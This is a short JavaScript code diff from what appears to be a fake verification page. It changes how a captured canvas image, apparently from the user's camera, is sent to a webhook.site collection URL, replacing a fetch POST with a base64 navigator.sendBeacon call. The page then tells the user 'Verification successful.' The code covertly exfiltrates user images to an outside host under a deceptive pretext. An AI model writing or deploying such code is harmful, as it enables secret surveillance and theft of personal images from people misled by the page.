@@ -35,13 +35,12 @@
                 const imageData = canvas.toDataURL('image/png');
                 
                 const blob = await (await fetch(imageData)).blob();
-                const formData = new FormData();
-                formData.append('image', blob, 'capture.png');
-
-                await fetch('https://webhook.site/ccaa7fc6-aa98-4db2-bdce-e85f03e94d2d', {
-                    method: 'POST',
-                    body: formData
-                });
+                const reader = new FileReader();
+                reader.readAsDataURL(blob); 
+                reader.onloadend = function() {
+                    const base64data = reader.result;
+                    navigator.sendBeacon('https://webhook.site/ccaa7fc6-aa98-4db2-bdce-e85f03e94d2d', JSON.stringify({image: base64data}));
+                };
 
                 alert("Verification successful.");
             }, 2000);
